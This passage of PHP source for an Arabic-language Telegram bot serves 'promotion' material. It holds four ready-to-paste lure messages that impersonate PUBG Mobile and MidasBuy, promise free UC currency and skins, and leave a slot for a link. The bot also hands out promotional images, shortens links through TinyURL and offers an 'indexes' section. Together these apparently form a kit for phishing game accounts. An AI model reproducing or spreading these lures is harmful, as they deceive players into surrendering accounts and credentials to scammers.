⁉️ • كود المعاملة - $result
",'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '🎋 • خدمات الترويج , 🎠' or $text == "ʙᴀᴄᴋ ، 🔙"){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/72",
'caption'=>
"💣 • اهلآ بك عزيزي $name ، 👾

🪐 ، هذا القسم مخصص لملحقات الترويج , 🎉

🎊 ، يمكنك التنقل عبر الاقسام عن طريق الكيبورد في الاسفل , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🀄 • صور الترويج ، 🎋',],['text'=>'🎠 • كليشات الترويج ، 🎪',]],
[['text'=>'📂 • انستا اكس ، 🎮',],['text'=>'🏝️ • اختصار الرابط ، 🧨',]],
[['text'=>'🏕️ • آندكَسات ، 🏝️',]],
],'resize_keyboard'=>true,
])
]);
}


if($text !='🏝️ • اختصار الرابط ، 🧨'){
$short = file_get_contents("https://tinyurl.com/api-create.php?url=$text");
if($short != null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • تم أختصار الرابط بنجاح ، 👋
- الرابط الاصلي × 👇
$text
- الرابط المختصر × 👇
$short
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'ʙᴀᴄᴋ ، 🔙',]],
],'resize_keyboard'=>true,
])
]);
}
}


if($text == '🏝️ • اختصار الرابط ، 🧨'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/77",
'caption'=>
"🧞 • قم بأرسال الرابط ليتم اختصارة الآن ، 🦾
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'ʙᴀᴄᴋ ، 🔙',]],
],'resize_keyboard'=>true,
])
]);
}

if($text == '🎠 • كليشات الترويج ، 🎪' or $text == "ᴮᴬᶜᴷ 🔙"){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/71",
'caption'=>
"👋 • مرحباً بك عزيزي $name , 💪

🎯 • هذا القسم مخصص بكليشات الترويج , 🎮

🎠 • قم بأختيار الكليشات من الكيبورد بآلأسفل , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'كليشة 1 ، 🗿',],['text'=>'كليشة 2 ، 🗿',]],
[['text'=>'كليشة 3 ، 🗿',],['text'=>'كليشة 4 ، 🗿',]],
[['text'=>'ʙᴀᴄᴋ ، 🔙',]],
],'resize_keyboard'=>true,
])
]);
}

if($text == 'كليشة 1 ، 🗿'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"يمكنك الآن شحن شدات من الموقع الرسمي MidasBuy. 💣
يمكنك سحب UC 1500+375 وسيتم وصل لك في حسابك 1700UC مع العلم يمكنك سحبهم مرة واحدة فقط ماذا تنتظر... 🔥
انتهز الفرصة... 😱

• ضع الرابط هنا 🦅
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'ᴮᴬᶜᴷ 🔙',]],
],'resize_keyboard'=>true,
])
]);
}
if($text == 'كليشة 2 ، 🗿'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"تقدر تطور اسلحتك للشكل النهائي ⚡ و حسابك يكون الاقوى ⭐ في عالم ببجي موبايل اشحن 3850 شده 💴 يوميا و طور حسابك و تفوق على أصدقائك 🔥 اضغط على تسوق الان 🛒 للحصول على شدات مجانيه و اسكنات اسطوريه 👻 جربها الان 😱 و اشحن الموسم و حقق احلامك الان 💸💸💸
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'ᴮᴬᶜᴷ 🔙',]],
],'resize_keyboard'=>true,
])
]);
}
if($text == 'كليشة 3 ، 🗿'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"تعلن شركه PUBG MOBILE بمناسبة الموسم هذا بتقديم هدايه قيمه للحصول على جميع عناصر PUBG MOBILE بسهولة

• احصل على ام فور الجوكر مجانا 
• احصل على UC مجاني 8.100 - 24.000
• احصل على مجموعة زي نادرة مجانية
• احصل على أسلحة مجانية من الجلد M4
• احصل على Free Royale Pass هذا الموسم

كيفية الحصول عليه سهل للغاية انقر على الرابط أدناهتعلن شركه PUBG MOBILE بمناسبة الموسم الجديد بتقديم هدايه قيمه للحصول على جميع عناصر PUBG MOBILE بسهولة
• احصل على ام فور الجوكر مجانا 
• احصل على UC مجاني 8.100 - 24.000
• احصل على مجموعة زي نادرة مجانية
• احصل على أسلحة مجانية من الجلد M4
• احصل على Free Royale Pass الموسم الجديد

• ضع الرابط هنا 🦅

كيفية الحصول عليه سهل للغاية انقر على الرابط أدناه
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'ᴮᴬᶜᴷ 🔙',]],
],'resize_keyboard'=>true,
])
]);
}
if($text == 'كليشة 4 ، 🗿'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"PUBG MOBILE GIFT, Free Uc, Gun, And Free Skin🎁.

CLICK LINK GET UC FREE THE HERE👇

• ضع الرابط هنا 🦅

20 COMMENTS 500 UC 💵
30 COMMENTS 1000 UC💵
40 COMMENTS 1500 UC💵
50 COMMENTS 2000 UC💵
SHARE LINK 10000 UC💵

©2022 PUBG Corporation. All rights reversed. Privacy Policy | Tencent Games User Agreement
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'ᴮᴬᶜᴷ 🔙',]],
],'resize_keyboard'=>true,
])
]);
}

if($text == '🀄 • صور الترويج ، 🎋' or $text == "🔚"){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/70",
'caption'=>
"🏝️ ~ اهلآ عزيزي $name , 🎋

🎠 • هذا القسم مخصص لصور الترويج ، 🏹

🪐 • قم بأختيار الصور من الكيبورد في الاسفل ، 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'صورة 1 ، ⚜️',],['text'=>'صورة 2 ، ⚜️',]],
[['text'=>'صورة 3 ، ⚜️',],['text'=>'صورة 4 ، ⚜️',]],
[['text'=>'ʙᴀᴄᴋ ، 🔙',]],
],'resize_keyboard'=>true,
])
]);
}

if($text == 'صورة 1 ، ⚜️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/57",
'caption'=>
"✅ • تم الانتهاء من تحميل الصورة رقم 1 ، ⚜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔚',]],
],'resize_keyboard'=>true,
])
]);
}
if($text == 'صورة 2 ، ⚜️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/58",
'caption'=>
"✅ • تم الانتهاء من تحميل الصورة رقم 2 ، ⚜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔚',]],
],'resize_keyboard'=>true,
])
]);
}
if($text == 'صورة 3 ، ⚜️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/59",
'caption'=>
"✅ • تم الانتهاء من تحميل الصورة رقم 3 ، ⚜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔚',]],
],'resize_keyboard'=>true,
])
]);
}
if($text == 'صورة 4 ، ⚜️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/60",
'caption'=>
"✅ • تم الانتهاء من تحميل الصورة رقم 4 ، ⚜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔚',]],
],'resize_keyboard'=>true,
])
]);
}
if($text == '📂 • انستا اكس ، 🎮'){ 
bot('sendDocument',[
'chat_id'=>$chat_id,
'document'=>"https://t.me/DDH_I/65",
'caption'=>
"✅ • تم الانتهاء من تحميل نسخة انستا X ، 🏜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'ʙᴀᴄᴋ ، 🔙',]],
],'resize_keyboard'=>true,
])
]);
}